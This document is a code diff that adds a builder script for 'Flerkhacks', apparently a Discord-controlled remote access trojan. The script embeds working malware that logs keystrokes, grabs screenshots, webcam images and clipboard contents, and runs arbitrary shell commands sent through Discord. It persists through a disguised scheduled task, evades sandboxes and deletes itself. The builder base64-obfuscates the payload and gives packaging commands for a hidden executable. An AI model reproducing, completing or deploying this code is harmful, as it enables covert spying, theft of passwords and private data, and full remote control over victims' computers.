@@ -1,0 +1,119 @@
+import base64
+import os
+import textwrap
+
+# --- THE ACTUAL BOT CODE ---
+# We use textwrap.dedent to ensure no "ghost" indents break the exec() call.
+original_code = textwrap.dedent("""\
+    import subprocess
+    import sys
+    import time
+    import discord
+    import requests
+    import shutil
+    import ctypes
+    import cv2
+    import pyperclip
+    from pynput import keyboard
+    from PIL import ImageGrab
+
+    # --- CONFIGURATION ---
+    TOKEN = "your bot token" 
+    CATEGORY_ID = your channel id 
+    TASK_NAME = "WindowsUpdateCheck"
+    ENABLE_ANTI_ANALYSIS = False 
+
+    keystrokes = ""
+
+    def on_press(key):
+        global keystrokes
+        try: keystrokes += str(key.char)
+        except AttributeError: keystrokes += f" [{str(key)}] "
+
+    def install_persistence():
+        try:
+            app_path = os.path.realpath(sys.executable)
+            cmd = f'schtasks /create /tn "{TASK_NAME}" /tr "{app_path}" /sc onlogon /rl highest /f'
+            subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
+        except: pass
+
+    def self_destruct():
+        try:
+            subprocess.run(f'schtasks /delete /tn "{TASK_NAME}" /f', shell=True, creationflags=0x08000000)
+            path = sys.executable
+            destruct_cmd = f'timeout /t 5 & del /f /q "{path}"'
+            subprocess.Popen(f'cmd /c {destruct_cmd}', shell=True, creationflags=0x08000000)
+            sys.exit()
+        except:
+            sys.exit()
+
+    def anti_analysis():
+        if not ENABLE_ANTI_ANALYSIS: return
+        if os.getlogin().lower() in ["triage", "sandbox", "pateu"] or ctypes.windll.kernel32.IsDebuggerPresent():
+            sys.exit()
+
+    anti_analysis()
+    install_persistence()
+
+    intents = discord.Intents.default()
+    intents.message_content = True
+    client = discord.Client(intents=intents)
+
+    @client.event
+    async def on_ready():
+        keyboard.Listener(on_press=on_press).start()
+        guild = client.guilds[0]
+        category = discord.utils.get(guild.categories, id=CATEGORY_ID)
+        channel = await guild.create_text_channel(f"node-{os.getlogin()}", category=category)
+        await channel.send("💀 **Flerkhacks active have fun**")
+
+    @client.event
+    async def on_message(message):
+        global keystrokes
+        if message.author == client.user or message.channel.category_id != CATEGORY_ID: return
+        cmd = message.content.strip().lower()
+
+        if cmd == "!self_destruct":
+            await message.channel.send("⚠️ **Self-destruct sequence initiated.**")
+            self_destruct()
+        elif cmd == "!logs":
+            with open("key.txt", "w") as f: f.write(keystrokes)
+            await message.channel.send(file=discord.File("key.txt"))
+            os.remove("key.txt"); keystrokes = ""
+        elif cmd == "!screen":
+            path = os.path.join(os.getenv('TEMP'), "s.png")
+            ImageGrab.grab().save(path); await message.channel.send(file=discord.File(path))
+            os.remove(path)
+        elif cmd == "!webcam":
+            cam = cv2.VideoCapture(0)
+            ret, frame = cam.read()
+            if ret:
+                path = os.path.join(os.getenv('TEMP'), "w.png")
+                cv2.imwrite(path, frame); await message.channel.send(file=discord.File(path))
+                os.remove(path)
+            cam.release()
+        elif cmd == "!clip":
+            await message.channel.send(f"📋 **Clipboard:** `{pyperclip.paste()}`")
+        elif cmd == "!gps":
+            geo = requests.get('https://ipapi.co/json/').json()
+            await message.channel.send(f"📍 **IP:** `{geo.get('ip')}` | **City:** {geo.get('city')}")
+        elif cmd.startswith("!kill "):
+            proc = cmd.split(" ")[1]
+            os.system(f"taskkill /f /im {proc}")
+            await message.channel.send(f"💀 Killed `{proc}`")
+        else:
+            output = subprocess.getoutput(message.content)
+            if output: await message.channel.send(f"```\\n{output[:1900]}\\n```")
+
+    client.run(TOKEN)
+""")
+
+# --- BUILDER ---
+try:
+    encoded = base64.b64encode(original_code.encode("utf-8")).decode("utf-8")
+    content = f'''import base64;exec(base64.b64decode("{encoded}").decode("utf-8"))'''
+    with open("final_bot.py", "w") as f:
+        f.write(content)
+    print("SUCCESS: Flerkhacks v5.0 (Cleaned) generated. use this command to run PyInstaller --onefile --noconsole --hidden-import=discord --hidden-import=cv2 --hidden-import=pynput.keyboard --hidden-import=pyperclip --hidden-import=PIL --hidden-import=PIL.ImageGrab --collect-all discord --collect-all cv2 --collect-all pynput --collect-all PIL --name \"flerktools\" final_bot.py")
+except Exception as e:
+    print(f"Error during build: {e}")  
